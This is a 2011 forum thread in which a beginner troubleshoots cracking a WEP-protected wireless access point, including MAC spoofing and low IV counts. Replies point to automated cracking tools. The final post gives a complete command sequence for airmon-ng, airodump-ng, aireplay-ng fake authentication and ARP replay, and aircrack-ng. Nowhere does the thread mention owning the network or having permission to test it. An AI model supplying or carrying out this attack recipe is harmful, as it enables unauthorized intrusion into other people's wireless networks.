---
title: "Cracking WEP problem"
date: 2011-05-22
forum: Networking &amp; Wireless
---

### Post by coldasice on 2011-05-22
Hi all, i`m kinda new , i would like some help and tell me if it`s something wrong because i`m not getting enoguh DATA (IVS)

i`m using ATHEROS 9285.

I changed my adapter`s mac with macchanger to 00:11:22:33:44:55 on my interface wlan0. I`m UNABLE to associate with the AP with the interface wlan0 , but i can inject packets with that interface and capture , i could only associate with the AP using mon0 or mon1 , is there a must to associate with the same interface (wlan0) and if so , what can i do...? i got around 130 data in 1 hour (injecting and capturing from wlan0 and associated from mon0 ) , my signal is around -90 . 
i tried without macchanging and same result, still reciving low data.

   Thanks

---

### Post by cayphed on 2011-05-22
I once had a simaliar problem when me and a mate were playing arround with a EeePc netbook, I found that using mon0 to do the crack works just fine.

---

### Post by coldasice on 2011-05-22
> **cayphed said:**
> I once had a simaliar problem when me and a mate were playing arround with a EeePc netbook, I found that using mon0 to do the crack works just fine.

i`m using eeePC , what about the signal ? how should it be ? 90 is fine ? thx

---

### Post by coldasice on 2011-05-22
can any1 else point me to the right direction please.

---

### Post by cayphed on 2011-05-22
Perhaps try [http://www.youtube.com/watch?v=T3iDWP2xeFw](http://www.youtube.com/watch?v=T3iDWP2xeFw) youtube has allways been the best help to cracking anything.....

---

### Post by Kangarooo on 2011-05-22
[http://wepcrack.sourceforge.net/](http://wepcrack.sourceforge.net/)
[http://code.google.com/p/grimwepa/](http://code.google.com/p/grimwepa/)
[http://code.google.com/p/wifite/](http://code.google.com/p/wifite/)

Grimwepa will be easyst- just install few programms with sudo apt-get install witch are mentioned in its website
but wifite will need more programms and thouse ull find on its website but on 2 different pages..
These methods will save u 3 days tryng to understand the manual way ur trying

---

### Post by coldasice on 2011-05-22
Thx a lot. 
  
But right now i think i`m closer of getting the wep since i managed to  follow all the steps from this tutorial ([http://sethioz.co.uk/forum/viewtopic.php?f=47&t=439#p3760](http://sethioz.co.uk/forum/viewtopic.php?f=47&t=439#p3760)) using packetforge and everything  works well and my screens looks like this : 
  
Read 43089123 packets (got 36318 ARP requests and 1288153, sent 1720437
  
and : 
 CH  1 ][ Elapsed: 1 hour 45 mins ][ 2011-05-22 13:48                                         
                                                                                                   PWR - 88 
DATA - 515 
BSSID             Lost           Packets       Probes
******               156873             3206941
Data is 515 from wich 260 IV , in 2 hours . tell me if it`s normal please . thx

---

### Post by coldasice on 2011-05-22
bump

---

### Post by coldasice on 2011-05-22
bump+

---

### Post by josephmills on 2011-05-22
```
sudo -s
```
```

airmon-ng stop [wireless card name]

``````
airmon-ng start [wireless card name]

``````
airmon-ng
``` have you now gone into monitor mode?
```
airodump-ng [wireless card name]
```
```

airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name] 
```then open new terminal ```
sudo -s 
```
```
aireplay-ng -1 0 -a [bssid] [wireless card name]
```then open new terminal ```
sudo -s
```then 
```
aireplay-ng -3 -b [bssid][wireless card name]
```now let run for an hour 
then open a new terminal and  
```

aircrack-ng [filename] 
``` (the file name is the -w from airodump-ng -w wep -c [channel number] --bssid [Bssid number] [wireless card name]   so in this case it will be wep.cap )
try it out tell me how it works or if there is a better way thanks I have also heard good things about fern wifi cracker [http://code.google.com/p/fern-wifi-cracker/](http://code.google.com/p/fern-wifi-cracker/)

---

